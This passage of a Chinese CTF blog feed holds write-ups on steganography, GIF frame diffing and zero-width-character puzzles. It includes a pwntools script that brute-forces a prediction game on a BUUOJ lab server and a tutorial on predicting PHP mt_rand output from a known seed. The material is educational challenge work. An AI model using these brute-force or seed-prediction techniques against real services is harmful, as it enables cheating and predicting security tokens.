class="hljs-type">Image</span>.open(&#x27;ezSteganography-flag.png&#x27;))<br>R,G,B=p[:,:,<span class="hljs-number">0</span>],p[:,:,<span class="hljs-number">1</span>],p[:,:,<span class="hljs-number">2</span>]<br>G=G.ravel()<br><br>te_out=extract(<span class="hljs-number">20</span>,G)<br>plt.imshow(np.<span class="hljs-built_in">array</span>(te_out).reshape(<span class="hljs-number">1440</span>,<span class="hljs-number">2560</span>))<br>plt.show()<br></code></pre></td></tr></table></figure><p>得到另一半flag</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122242-47584.png" alt="image-20210815122241546"></p><h2 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h2><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import *       <span class="hljs-comment">#需要用到pwntools模块</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25900</span>)        <span class="hljs-comment">#连接，相当于nc，注：25900是端口，每一次开靶机基本上都不同</span><br>payload = [<span class="hljs-string">&#x27;r&#x27;</span>] * <span class="hljs-number">66</span>    <span class="hljs-comment">#先把答案设置成66个‘r’</span><br>restart = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> restart:<br>    restart = <span class="hljs-number">0</span>        <span class="hljs-comment">#先把restart改为0，避免死循环</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">66</span>):        <span class="hljs-comment">#循环发送答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:&#x27;</span>)        <span class="hljs-comment">#接收函数，一直接收，直到接收到设定的字符串才进行下一语句</span><br>        io.sendline(payload[i])        <span class="hljs-comment">#发送函数，上传第i个答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;Team&#x27;</span>)<br>        io.recvuntil(<span class="hljs-string">&quot;Team\n&quot;</span>)        <span class="hljs-comment">#因为输入一个答案后会有两个&#x27;Team&#x27;的字符串，所以接收两个‘Team&#x27;后进行下一语句</span><br>        p = io.recv(<span class="hljs-number">10</span>)        <span class="hljs-comment">#接收函数，可控制接收的字符数量，这里接收10个字符</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;The number&#x27;</span> in p:        <br>            <span class="hljs-keyword">continue</span>        <span class="hljs-comment">#接收到&#x27;The number&#x27;则说明这个答案对了，继续进行下一个for语句发送下一个答案</span><br>        <span class="hljs-keyword">else</span>:<br>            io.recvuntil(<span class="hljs-string">&#x27;Play again? (y/n): &#x27;</span>)         <span class="hljs-comment">#如果没有接收到&#x27;The number&#x27;,则第i个答案错误，接收完字符</span><br>            payload[i] = <span class="hljs-string">&#x27;b&#x27;</span>        <span class="hljs-comment">#将第i个答案改正</span><br>            io.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)        <span class="hljs-comment">#发送‘y’重新游戏</span><br>            restart = <span class="hljs-number">1</span>         <span class="hljs-comment">#将restart改为1，将会重新while循环</span><br>            <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs autoit">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 <span class="hljs-built_in">exp</span>.py                                                                         <br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    <span class="hljs-keyword">To</span> disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache<span class="hljs-number">-3.9</span>/update <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;never&#x27;</span> (old way).<br>    <span class="hljs-literal">Or</span> add the following lines <span class="hljs-keyword">to</span> ~/.pwn.conf <span class="hljs-literal">or</span> ~/.config/pwn.conf (<span class="hljs-literal">or</span> /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] A newer version of pwntools is available on pypi (<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>.dev0 --&gt; <span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0).<br>    Update <span class="hljs-keyword">with</span>: $ pip install -U pwntools==<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0<br>[+] Opening connection <span class="hljs-keyword">to</span> node4.buuoj.cn on port <span class="hljs-number">25868</span>: Done<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">14</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">16</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(list[i])<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">0</span><br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">33</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">28</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">1</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">3</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">4</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">9</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">10</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">12</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">13</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">18</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">20</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">22</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">24</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">26</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">28</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">29</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">31</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">32</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">33</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">35</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">38</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">39</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">40</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">41</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">44</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">45</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">46</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">48</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">50</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">53</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">54</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">55</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">58</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">60</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">61</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">66</span><br>[*] Closed connection <span class="hljs-keyword">to</span> node4.buuoj.cn port <span class="hljs-number">25868</span><br>[+] Flag: flag&#123;b<span class="hljs-string">&#x27;c069b2d7-0fca-4819-a656-44e4451deaaf&#x27;</span>&#125;<br>[+] Time: <span class="hljs-number">50.63801121711731</span>s<br></code></pre></td></tr></table></figure><h2 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h2><p>提取帧数，一共451帧,对比发现11帧一组，一共41组.</p><p>把除第1组之后的每一组的第n帧跟第一组的第n帧比较，相同为纯白，不同为纯黑</p><p>把同内容的图片作为一个系列，然后系列中的图片与该系列第一张图片比较，新建一张</p><p>83x83的空白图，把所有存在像素值不同的位置标记为黑色，即可得到隐藏的11张图片</p><p>中的1张，剩下的以此类推即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8 </span><br><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <br><br><span class="hljs-comment">#分离gif </span><br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Just_a_GIF.gif&#x27;</span>) <br>os.mkdir(<span class="hljs-string">&#x27;./png&#x27;</span>) <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.n_frames): <br>img.seek(i) <br>new = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img.size) <br>new.paste(img) <br>new.save(<span class="hljs-string">&#x27;png\\&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br><br>    <br>    <br><span class="hljs-comment">#处理分离出来的png </span><br>os.mkdir(<span class="hljs-string">&#x27;./flag&#x27;</span>) <br><br>path1=<span class="hljs-string">r&quot;./flag/&quot;</span> <br>path2=<span class="hljs-string">r&quot;./png/&quot;</span> <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>): <br>img=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br><span class="hljs-comment">#隐藏的图片尺寸为83*83 </span><br>img1=Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">83</span>,<span class="hljs-number">83</span>),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>)) <br><span class="hljs-comment">#图片每帧跟同内容的第一帧进行像素比较，不同处用黑色，叠加起来 </span><br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>): <br>im=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>((h+<span class="hljs-number">1</span>)*<span class="hljs-number">11</span>+i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br>width,height=img.size <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,width):<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,height): <br>tmp = img.getpixel((j,k)) <br>tmp1 = im.getpixel((j,k)) <br><span class="hljs-keyword">if</span> tmp != tmp1: <br>img1.putpixel((j,k),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) <br>img1.save(path1+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br></code></pre></td></tr></table></figure><p>得到11张图片</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122323-509098.png" alt="image-20210815122322173"></p><p>按照10和11的顺序拼接得到</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122333-324537.png" alt="image-20210815122331942"></p><p>DataMatrix：<a href="https://demo.dynamsoft.com/barcode-reader/">https://demo.dynamsoft.com/barcode-reader/</a></p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122350-188687.png" alt="image-20210815122347387"></p><h2 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h2><p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p><p>思路：直接处理图片的三个通道，观察rgb数值，并进行chr，可以发现有大量的重复的内容，猜测可以利用词频进行排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Nuclear wastewater.png&#x27;</span>)<br>a, b = pic.size<br>list1 = []  <span class="hljs-comment">#将三个像素值都存入列表元素</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,b,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, a, <span class="hljs-number">10</span>):<br>        pixel = pic.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel == (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>):<br>             <span class="hljs-keyword">continue</span><br>        r, g, b1 = pixel<br>        list1.extend([r, g, b1])<br><span class="hljs-comment">#print(list1)</span><br><br>dic1 = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    dic1[i] = dic1.get(i, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>result = <span class="hljs-built_in">sorted</span>(dic1.items(), key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> result:<br>    print(<span class="hljs-built_in">chr</span>(s[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theKEYis:</span><span class="hljs-meta">#R@/&amp;p~!(▒?£ñ$ªVJÞÍFjÀÈ÷¢©¼§UÌ¦õ±·ðäôÉCS</span><br><span class="hljs-number">2</span>ÚHÏ&gt;Á<br></code></pre></td></tr></table></figure><p>得到口令#R@/&amp;p~!，解压得到flag.txt</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122426-607150.png" alt="image-20210815122425969"></p><p>有猫腻，vim查看一下</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122440-299502.png" alt="image-20210815122438743"></p><p>零宽字节隐写，包含200C、200D、200E，</p><p>解题工具：<a href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>先在下面设置一下，勾选零宽字符：</p><p>U+200C ZERO WIDTH NON-JOINER<br>U+200D ZERO WIDTH JOINER<br>U+200E LEFT-TO-RIGHT MARK</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122452-433384.png" alt="image-20210815122451134"></p><p>根据提示Citrix CTX1解密</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI</span><br></code></pre></td></tr></table></figure><p>解码两次得到flag</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122503-379175.png" alt="image-20210815122502554"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CRYPTO&quot;&gt;&lt;a href=&quot;#CRYPTO&quot; class=&quot;headerlink&quot; title=&quot;CRYPTO&quot;&gt;&lt;/a&gt;CRYPTO&lt;/h1&gt;&lt;h2 id=&quot;Yusa的密码学签到——BlockTrick&quot;&gt;&lt;a href=&quot;#Yusa的密码学签到——Blo</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="比赛复现" scheme="https://swhat.github.io/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="https://swhat.github.io/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪随机数漏洞</title>
    <link href="https://swhat.github.io/2021/08/04/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://swhat.github.io/2021/08/04/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-08-04T14:26:42.000Z</published>
    <updated>2021-11-27T12:18:51.113Z</updated>
    
    <content type="html"><![CDATA[<p>由于mt_rand()的生成的随机数只跟seed和调用该函数的次数有关。举一个简单的例子来说明一下这个问题，假设使用mt_srand(1111111)进行了一次播种操作，接下来调用mt_rand()函数，第一次生成的数值为a,第二次生成的为b，第三次生成的为c。任何一个人拿到这样的一串代码，所执行的结果都是跟刚刚描述的一样。所以当你的seed数值被他人知道后，就可以预测出你接下来的数值是多少，这就是该函数的一个问题，他并不能起到一个真随机数的作用。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">mt_scrand() //播种 Mersenne Twister 随机数生成器。<br>mt_rand()   //生成随机数<br><br>srand() //给rand()函数播种<br>rand() //不指定参数时，范围0-32767<br><br><br>#mt_rand()和rand()产生的最大随机数都是2^31-1<br></code></pre></td></tr></table></figure><p>简单来说mt_scrand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数</p><h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">mt_srand([ <span class="hljs-keyword">int</span> <span class="hljs-variable">$seed</span>] ) : <span class="hljs-keyword">void</span><br></code></pre></td></tr></table></figure><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">mt_rand( <span class="hljs-keyword">void</span>) : <span class="hljs-keyword">int</span><br><br>mt_rand( <span class="hljs-keyword">int</span> <span class="hljs-variable">$min</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$max</span>) : <span class="hljs-keyword">int</span><br></code></pre></td></tr></table></figure><p>用 seed 来给随机数发生器播种。没有设定 seed 参数时，会被设为随时数。使用者在进行一次mt_srand()操作后，seed数值将被固定下来，给接下来的mt_rand()函数使用。</p><p>实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand();  <br><span class="hljs-keyword">echo</span> mt_rand() . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand(<span class="hljs-number">5</span>, <span class="hljs-number">15</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>mt_srand(<span class="hljs-number">1234</span>);  <br><span class="hljs-keyword">echo</span> mt_rand() . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand(<span class="hljs-number">5</span>, <span class="hljs-number">15</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">497738439</span><br><span class="hljs-number">11</span><br><span class="hljs-number">1741177057</span><br><span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="mt-rand-存在的问题"><a href="#mt-rand-存在的问题" class="headerlink" title="mt_rand()存在的问题"></a>mt_rand()存在的问题</h3><p>由于mt_rand()的生成的随机数只跟seed和调用该函数的次数有关。举一个简单的例子来说明一下这个问题，假设使用mt_srand(1111111)进行了一次播种操作，接下来调用mt_rand()函数，第一次生成的数值为a,第二次生成的为b，第三次生成的为c。任何一个人拿到这样的一串代码，所执行的结果都是跟刚刚描述的一样。所以当你的seed数值被他人知道后，就可以预测出你接下来的数值是多少，这就是该函数的一个问题，他并不能起到一个真随机数的作用。</p><p>说到mt_rand() 和mt_srand()，这里也顺便提及rand()和 srand()</p><p>代码实例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br>srand(<span class="hljs-number">123</span>);<br>mt_srand(<span class="hljs-number">1234</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;rand在种子是123时产生的随机数序列：\n&quot;</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> rand().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;mt_srand在种子是1234时产生的随机数序列:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>     <span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">rand在种子是<span class="hljs-number">123</span>时产生的随机数序列：<br><span class="hljs-number">440</span><br><span class="hljs-number">19053</span><br><span class="hljs-number">23075</span><br><span class="hljs-number">13104</span><br><span class="hljs-number">32363</span><br>mt_srand在种子是<span class="hljs-number">1234</span>时产生的随机数序列:<br><span class="hljs-number">1741177057</span><br><span class="hljs-number">1068724585</span><br><span class="hljs-number">1335968403</span><br><span class="hljs-number">400890732</span><br><span class="hljs-number">1196196624</span><br></code></pre></td></tr></table></figure><p>当种子固定时，每次运行代码时，mt_rand和rand所产生的的随机数分别是一样的,所以如果我们在代码中自己播种了随机数种子,但是泄露了这个种子,就会导致产生的随机数序列被别人猜到,造成安全问题。</p><p><strong>注意：自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</strong></p><h2 id="固定的种子"><a href="#固定的种子" class="headerlink" title="固定的种子"></a>固定的种子</h2><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</p><p>我们来写段代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br>mt_srand(<span class="hljs-number">12345</span>);            <span class="hljs-comment">#分发seed种子12345</span><br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-comment">#mt_rand()生成随机数</span><br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>输出结果是162946439。</p><p>修改代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 